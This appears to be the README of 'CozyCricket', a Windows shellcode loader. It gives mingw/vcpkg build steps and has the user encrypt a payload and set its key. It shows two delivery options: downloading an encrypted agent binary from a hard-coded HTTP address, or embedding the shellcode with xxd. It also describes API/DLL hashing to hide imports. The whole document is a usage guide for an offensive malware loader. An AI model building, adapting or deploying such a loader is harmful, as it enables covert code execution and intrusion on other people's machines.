## Build

```bash
# install mingw
sudo apt install mingw-w64

# install vcpkg
git clone https://github.com/microsoft/vcpkg.git
cd vcpkg
./bootstrap-vcpkg.sh
export VCPKG_PATH=`pwd`
```

```bash
export CXX=x86_64-w64-mingw32-g++
rm -rf build

# build
cmake -S . -B build \
-DCMAKE_TOOLCHAIN_FILE="$VCPKG_PATH/scripts/buildsystems/vcpkg.cmake" \
-DVCPKG_TARGET_TRIPLET=x64-mingw-static \
-DCMAKE_EXPORT_COMPILE_COMMANDS=ON

# encrypt the shellcode
java EncryptFile.java $FILE $KEY

# define the KEY inside vars.hpp
vi static/vars.hpp

### MAKE REQUIRED ADJUSTMENTS (see ## Adjust)

cmake --build build --config Release -j
```

## Adjust

### Shellcode retrieval

#### Fetch using HTTP

1. modify `CMakeLists.txt` for a compiler to use the correct definition for `retrieve_bytecode()`

```cmakelists
add_definitions(-DRETRIEVE_FETCH)
```

2. write a URI to query into `static/vars.hpp`

```c
#define BYTECODE_URI "http://192.168.88.250:9595/build/tmp/agent.bin.enc"
```

#### Embed into the executable

1. modify `CMakeLists.txt` for a compiler to use the correct definition for `retrieve_bytecode()`

```cmakelists
add_definitions(-DRETRIEVE_LOCAL)
```

2. generate an hpp file that contains the encrypted shellcode

```bash
xxd -n eBytecode -i $PATH_TO_ENCRYPTED_SHELLCODE > static/bytecode.cpp
sed -i "1s/^/#include \"bytecode.hpp\"\n/" static/bytecode.cpp
```

## Development

Take a look at `.clangd` file and how it defines paths to libraries. Make sure you launch your IDE with the CozyCricket directory being the root of the project.

### Adding functionality

- add `func.cpp` (optionally include conditional compilation macros)
- add `func.hpp`
- edit `add_executable` (and `add_definitions` if you added `#ifdef` blocks) within `CMakeLists.txt`
- regenerate build files via `cmake`

### Using hash functions

This project implements API/DLL hashing functionality. If you wish to hash your own string please consider using the built-in hash function of interest. After enabling the required compilation flags for the appropriate hashing function you can do something like this:

```cpp
std::cout << hash((const char*)"C:\\Windows\\SYSTEM32\\ntdll.dll") << std::endl;
```
